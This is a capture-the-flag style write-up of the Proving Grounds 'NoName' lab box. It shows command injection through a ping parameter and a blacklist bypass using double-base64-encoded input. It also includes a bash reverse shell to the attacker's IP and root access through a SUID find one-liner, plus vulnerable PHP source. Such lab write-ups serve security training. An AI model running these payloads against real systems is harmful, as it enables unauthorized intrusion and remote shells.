---
title: NoName - Proving Grounds
date: 2022-07-27
categories:
  - Writeup
  - Proving_Grounds
tags:
  - Command Injection
  - SUID
excerpt_separator: <!--more-->
toc: true
toc_sticky: true
image: offsec.png
platform: offsecsil2.png
---

Easy rated Proving Grounds Play machine that covers command injection and SUID privesc. 

<!--more-->


## NMAP

```
PORT   STATE SERVICE
80/tcp open  http
```

## Port 80 Enumeration

I started with my usual enumeration of http with Nikto and Gobuster. Nikto did not return anthing interesting while Gobuster returned `admin` and `superadmin.php`

    - `admin` only has pictures posted with no functionality
    - `superadmin.php` looks more interesting as looks like there is a ping functionality that we can play with.


![admin](\assets\images\noname-pg\2022-07-27-15-23-21.png)

![superadmin](\assets\images\noname-pg\2022-07-27-15-41-18.png)

Intercepting the request with burp we can see two parameters `pinger` and `submitt`. `pinger` looks really interesting and is screaming command injection :p

![](\assets\images\noname-pg\2022-07-27-15-42-17.png)

Trying command injection with `sleep` command. I tried `;` and `&` but did not work, while trying `|` worked

![](\assets\images\noname-pg\2022-07-27-15-43-36.png)

As we can see from the bottom of the screenshot we were able to successfully inject the `sleep` command resulting to a five second delay in the response. 

Now that we have confirmed the command injection vulnerability we can now try some basic [reverse shell payload](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet). I tried the bash, nc, and python payloads but nothing worked. I also tried `ls`, `pwd`, and `cat /etc/passwd` but it also did not return anything, so I tried `cat superadmin.php` and the response returned the following:

```php
<?php
   if (isset($_POST['submitt']))
{
   	$word=array(";","&&","/","bin","&"," &&","ls","nc",
    "dir","pwd");
   	$pinged=$_POST['pinger'];
   	$newStr = str_replace($word, "", $pinged);
   	if(strcmp($pinged, $newStr) == 0)
		{
		    $flag=1;
		}
       else
		{
		   $flag=0;
		}
}

if ($flag==1){
$outer=shell_exec("ping -c 3 $pinged");
echo "<pre>$outer</pre>";
}
?>
```

Looks like there are blacklisted characters and commands, that's why we can't `ls` and `cat /etc/passwd`. From here I thought we can try try echoing a `base64` encoded command then pipe it to `base64 -d` then to `bash`. Something like the following:
```bash
echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | bash`
```

![](\assets\images\noname-pg\2022-07-27-16-26-33.png)

And it worked, so I tried with a reverse shell 

```bash
bash -i >& /dev/tcp/192.168.49.210/80 0>&1
```
    
For some reason the following `base64` encoded reverse shell payload still did not work:

```bash 
|echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ5LjIxMC84MCAwPiYx'|base64 -d|bash
``` 

Which is really weird, So to troubleshoot I tried removing the last `|bash` part in my payload so it will print the `base64` decoded payload instead of executing it with bash, and I got the following response
           
![](\assets\images\noname-pg\2022-07-27-16-48-44.png)

Looks like it is not printing the whole `base64` encoded command. not sure why but that's the reason our reverse shell is not getting executed properly. From here I tried double `base64` encoding my payload and it worked 

```bash
|echo 'WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE9USXVNVFk0TGpRNUxqSXhNQzg0TUNBd1BpWXg='|base64 -d|base64 -d|bash`
```

![](\assets\images\noname-pg\2022-07-27-16-46-09.png)

## Privesc


Now we have a shell as `www-data` first thing I check usually is the `SUIDs`. I noticed `/usr/bin/find` not sure if it is normal but I checked in [GTFObins](https://gtfobins.github.io/gtfobins/find/#suid) and looks like we can privesc using this command.

![](\assets\images\noname-pg\2022-07-27-16-52-16.png)

Using the following command `find . -exec /bin/sh \; -quit` gave us root access to the box.

![](\assets\images\noname-pg\2022-07-27-16-54-22.png)

